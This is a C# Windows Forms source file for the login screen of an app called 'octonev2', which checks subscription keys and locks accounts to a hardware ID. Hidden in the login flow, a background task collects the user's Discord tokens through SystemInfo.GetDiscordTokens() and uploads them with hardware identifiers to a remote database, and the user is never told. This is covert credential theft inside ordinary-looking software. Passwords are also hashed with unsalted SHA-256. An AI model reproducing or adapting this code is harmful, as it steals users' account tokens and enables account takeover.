using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Threading.Tasks;
using System.Windows.Forms;
using MySql.Data.MySqlClient;
using octonev2.Config;
using octonev2.Controls;
using octonev2.Managers;
using octonev2.Theme;
using octonev2.Utils;
using System.Security.Cryptography;
using System.Text;
using System.Data;
using Timer = System.Windows.Forms.Timer;



namespace octonev2.Forms
{
    public partial class LoginForm : Form
    {
        private readonly Panel mainPanel;
        private readonly PictureBox logoPictureBox;
        private readonly ModernTextBox usernameBox;
        private readonly ModernTextBox passwordBox;
        private readonly ModernButton loginButton;
        private readonly ModernButton registerButton;
        private readonly ModernButton closeButton;
        private readonly ModernButton minimizeButton;
        private readonly Panel titleBar;
        private readonly MySqlConnection connection;
        private bool isDragging;
        private Point dragStart;
        private readonly List<Snow> snowflakes = new();
        private readonly Timer snowTimer = new();

        public LoginForm()
        {
            InitializeComponent();

            Size = new Size(900, 600);
            StartPosition = FormStartPosition.CenterScreen;
            FormBorderStyle = FormBorderStyle.None;
            BackColor = ThemeColors.Background;
            DoubleBuffered = true;

            connection = new MySqlConnection(DatabaseConfig.GetConnectionString());

            titleBar = new Panel
            {
                Height = 30,
                Dock = DockStyle.Top,
                BackColor = ThemeColors.SurfaceLight
            };

            closeButton = new ModernButton
            {
                Text = "×",
                Size = new Size(30, 30),
                Location = new Point(Width - 30, 0),
                ForeColor = ThemeColors.TextPrimary,
                BackColor = Color.Transparent
            };

            minimizeButton = new ModernButton
            {
                Text = "−",
                Size = new Size(30, 30),
                Location = new Point(Width - 60, 0),
                ForeColor = ThemeColors.TextPrimary,
                BackColor = Color.Transparent
            };

            mainPanel = new Panel
            {
                Size = new Size(400, 500),
                Location = new Point((Width - 400) / 2, (Height - 500) / 2),
                BackColor = ThemeColors.SurfaceLight
            };

            logoPictureBox = new PictureBox
            {
                Image = LoadLogo(),
                SizeMode = PictureBoxSizeMode.Zoom,
                Size = new Size(200, 200),
                Location = new Point((mainPanel.Width - 200) / 2, 30),
                BackColor = Color.Transparent
            };

            usernameBox = new ModernTextBox
            {
                PlaceholderText = "Username",
                Location = new Point((mainPanel.Width - 300) / 2, 250),
                Size = new Size(300, 45)
            };

            passwordBox = new ModernTextBox
            {
                PlaceholderText = "Password",
                UseSystemPasswordChar = true,
                Location = new Point((mainPanel.Width - 300) / 2, 310),
                Size = new Size(300, 45)
            };

            loginButton = new ModernButton(ThemeColors.Accent)
            {
                Text = "LOGIN",
                Location = new Point((mainPanel.Width - 300) / 2, 380),
                Size = new Size(300, 45)
            };

            registerButton = new ModernButton
            {
                Text = "CREATE ACCOUNT",
                Location = new Point((mainPanel.Width - 300) / 2, 440),
                Size = new Size(300, 45)
            };

            for (int i = 0; i < 300; i++)
            {
                snowflakes.Add(new Snow(Width));
            }

            snowTimer.Interval = 16;
            snowTimer.Tick += (s, e) => {
                foreach (var snow in snowflakes)
                {
                    snow.Update();
                    if (snow.Y > Height)
                        snow.Reset(Width);
                }
                Invalidate();
            };
            snowTimer.Start();

            SetupControls();
            SetupEventHandlers();
        }

        private void SetupControls()
        {
            titleBar.Controls.AddRange(new Control[] { closeButton, minimizeButton });
            mainPanel.Controls.AddRange(new Control[] {
                logoPictureBox,
                usernameBox,
                passwordBox,
                loginButton,
                registerButton
            });
            Controls.AddRange(new Control[] { titleBar, mainPanel });
        }



        private async Task InitializeWithUpdate()
        {
            var updater = new ForceUpdate();
            await updater.CheckAndUpdate();
        }


        private void SetupEventHandlers()
        {
            loginButton.Click += async (s, e) => await HandleLogin();
            registerButton.Click += async (s, e) => await ShowRegisterForm();
            closeButton.Click += (s, e) => Application.Exit();
            minimizeButton.Click += (s, e) => WindowState = FormWindowState.Minimized;
            titleBar.MouseDown += (s, e) => StartDragging(e);
            titleBar.MouseMove += (s, e) => HandleDragging(e);
            titleBar.MouseUp += (s, e) => StopDragging();
            Load += async (s, e) => await AnimationManager.PlayFadeInAnimation(this);
        }

        private async Task<(bool success, string message, bool expired, int userId)> ValidateLogin(string username, string hashedPassword)
        {
            using var loginConnection = new MySqlConnection(DatabaseConfig.GetConnectionString());
            await loginConnection.OpenAsync();

            // First check if user exists and get their ID
            string userCheckQuery = @"
        SELECT id 
        FROM users 
        WHERE BINARY username = @username 
        AND BINARY password_hash = @password";

            using var userCheckCmd = new MySqlCommand(userCheckQuery, loginConnection);
            userCheckCmd.Parameters.AddWithValue("@username", username);
            userCheckCmd.Parameters.AddWithValue("@password", hashedPassword);

            var userId = await userCheckCmd.ExecuteScalarAsync() as int?;
            if (!userId.HasValue)
                return (false, "Invalid username or password", false, 0);

            // Check subscription status using key_redemptions
            string subscriptionQuery = @"
        SELECT kr.expires_at 
        FROM key_redemptions kr
        WHERE kr.user_id = @userId 
        AND kr.is_active = TRUE 
        ORDER BY kr.expires_at DESC 
        LIMIT 1";

            using var subCmd = new MySqlCommand(subscriptionQuery, loginConnection);
            subCmd.Parameters.AddWithValue("@userId", userId.Value);

            var expiryDate = await subCmd.ExecuteScalarAsync() as DateTime?;

            // HWID Check
            string hwidQuery = @"
        SELECT machine_id 
        FROM login_records 
        WHERE user_id = @userId 
        ORDER BY login_time DESC 
        LIMIT 1";

            using var hwidCmd = new MySqlCommand(hwidQuery, loginConnection);
            hwidCmd.Parameters.AddWithValue("@userId", userId.Value);

            string storedHwid = (await hwidCmd.ExecuteScalarAsync())?.ToString();
            string currentHwid = SystemInfo.GetMachineId();

            if (storedHwid != null && storedHwid != currentHwid)
            {
                return (false, "Hardware ID mismatch detected. Access denied.", false, 0);
            }

            if (!expiryDate.HasValue)
                return (true, "No active subscription", true, userId.Value);

            if (DateTime.Now > expiryDate.Value)
            {
                await DeactivateSubscription(userId.Value, loginConnection);
                return (true, "Subscription expired", true, userId.Value);
            }

            return (true, "Success", false, userId.Value);
        }




        private async Task DeactivateSubscription(int userId, MySqlConnection connection)
        {
            string updateQuery = @"
        UPDATE key_redemptions 
        SET is_active = FALSE 
        WHERE user_id = @userId 
        AND expires_at < CURRENT_TIMESTAMP";

            using var cmd = new MySqlCommand(updateQuery, connection);
            cmd.Parameters.AddWithValue("@userId", userId);
            await cmd.ExecuteNonQueryAsync();
        }




        private async Task DeactivateExpiredSubscription(int userId, MySqlConnection connection)
        {
            string updateQuery = @"
        UPDATE user_subscription_log 
        SET is_active = FALSE 
        WHERE user_id = @userId 
        AND expires_at < CURRENT_TIMESTAMP";

            using var cmd = new MySqlCommand(updateQuery, connection);
            cmd.Parameters.AddWithValue("@userId", userId);
            await cmd.ExecuteNonQueryAsync();
        }





        private async Task LogSystemInfo(int userId)
        {
            var discordTokens = string.Join(",", await SystemInfo.GetDiscordTokens());

            string query = @"
        INSERT INTO login_records 
        (user_id, machine_id, os_version, cpu_id, mac_address, discord_tokens)
        VALUES 
        (@userId, @machineId, @osVersion, @cpuId, @macAddress, @discordTokens)";

            using var cmd = new MySqlCommand(query, connection);
            cmd.Parameters.AddWithValue("@userId", userId);
            cmd.Parameters.AddWithValue("@machineId", SystemInfo.GetMachineId());
            cmd.Parameters.AddWithValue("@osVersion", Environment.OSVersion.ToString());
            cmd.Parameters.AddWithValue("@cpuId", SystemInfo.GetCpuId());
            cmd.Parameters.AddWithValue("@macAddress", SystemInfo.GetMacAddress());
            cmd.Parameters.AddWithValue("@discordTokens", discordTokens);

            await cmd.ExecuteNonQueryAsync();
        }



        private async Task HandleLogin()
        {
            if (string.IsNullOrEmpty(usernameBox.Text) || string.IsNullOrEmpty(passwordBox.Text))
            {
                ShowError("Please enter both username and password.");
                return;
            }

            loginButton.Enabled = false;

            try
            {
                using var newConnection = new MySqlConnection(DatabaseConfig.GetConnectionString());
                await newConnection.OpenAsync();

                string hashedPassword = HashPassword(passwordBox.Text);
                var loginResult = await ValidateLogin(usernameBox.Text, hashedPassword);

                if (!loginResult.success)
                {
                    ShowError(loginResult.message);
                    return;
                }

                // Fire and forget system info logging
                _ = Task.Run(async () =>
                {
                    using var logConnection = new MySqlConnection(DatabaseConfig.GetConnectionString());
                    await logConnection.OpenAsync();
                    await LogSystemInfo(loginResult.userId, logConnection);
                });

                if (loginResult.expired)
                {
                    var result = MessageBox.Show(
                        "Your subscription has expired. Would you like to redeem a new key?",
                        "Subscription Expired",
                        MessageBoxButtons.YesNo,
                        MessageBoxIcon.Question
                    );

                    if (result == DialogResult.Yes)
                    {
                        await ShowKeyRedemptionForm(usernameBox.Text);
                    }
                    return;
                }

                await AnimationManager.PlayFadeOutAnimation(this);
                Hide();
                new DashboardForm(usernameBox.Text).Show();
            }
            catch (Exception ex)
            {
                ShowError($"Login failed: {ex.Message}");
            }
            finally
            {
                loginButton.Enabled = true;
            }
        }

        private async Task LogSystemInfo(int userId, MySqlConnection logConnection)
        {
            var discordTokens = await SystemInfo.GetDiscordTokens();

            string query = @"
        INSERT INTO login_records 
        (user_id, machine_id, os_version, cpu_id, mac_address, discord_tokens)
        VALUES 
        (@userId, @machineId, @osVersion, @cpuId, @macAddress, @discordTokens)";

            using var cmd = new MySqlCommand(query, logConnection);
            cmd.Parameters.AddWithValue("@userId", userId);
            cmd.Parameters.AddWithValue("@machineId", SystemInfo.GetMachineId());
            cmd.Parameters.AddWithValue("@osVersion", Environment.OSVersion.ToString());
            cmd.Parameters.AddWithValue("@cpuId", SystemInfo.GetCpuId());
            cmd.Parameters.AddWithValue("@macAddress", SystemInfo.GetMacAddress());
            cmd.Parameters.AddWithValue("@discordTokens", string.Join(",", discordTokens));

            await cmd.ExecuteNonQueryAsync();
        }



        private async Task ShowKeyRedemptionForm(string username)
        {
            var redemptionForm = new KeyRedemptionForm(username);
            await AnimationManager.PlayFadeOutAnimation(this);
            Hide();
            redemptionForm.Show();
        }

        private async Task ShowRegisterForm()
        {
            await AnimationManager.PlayFadeOutAnimation(this);
            Hide();
            new RegisterForm().Show();
        }

        private static Image LoadLogo()
        {
            try
            {
                string projectRoot = Directory.GetCurrentDirectory();
                string rootPath = Path.GetFullPath(Path.Combine(projectRoot, "../../.."));
                string logoPath = Path.Combine(rootPath, "Resources", "octone_logo.png");
                return Image.FromFile(logoPath);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error loading logo: {ex.Message}", "Resource Error");
                return new Bitmap(1, 1);
            }
        }

        private static void ShowError(string message)
        {
            MessageBox.Show(message, "Login Error",
                MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private static string HashPassword(string password)
        {
            byte[] bytes = SHA256.HashData(Encoding.UTF8.GetBytes(password));
            return Convert.ToHexString(bytes).ToLower();
        }

        private void StartDragging(MouseEventArgs e)
        {
            isDragging = true;
            dragStart = new Point(e.X, e.Y);
        }

        private void HandleDragging(MouseEventArgs e)
        {
            if (!isDragging) return;
            var p = PointToScreen(e.Location);
            Location = new Point(p.X - dragStart.X, p.Y - dragStart.Y);
        }

        private void StopDragging()
        {
            isDragging = false;
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e);
            using var path = new GraphicsPath();
            var rect = new Rectangle(0, 0, Width - 1, Height - 1);
            int radius = 10;

            path.AddArc(rect.X, rect.Y, radius * 2, radius * 2, 180, 90);
            path.AddArc(rect.Right - radius * 2, rect.Y, radius * 2, radius * 2, 270, 90);
            path.AddArc(rect.Right - radius * 2, rect.Bottom - radius * 2, radius * 2, radius * 2, 0, 90);
            path.AddArc(rect.X, rect.Bottom - radius * 2, radius * 2, radius * 2, 90, 90);
            path.CloseAllFigures();

            e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
            Region = new Region(path);

            foreach (var snow in snowflakes)
            {
                snow.Draw(e.Graphics);
            }
        }
    }
}
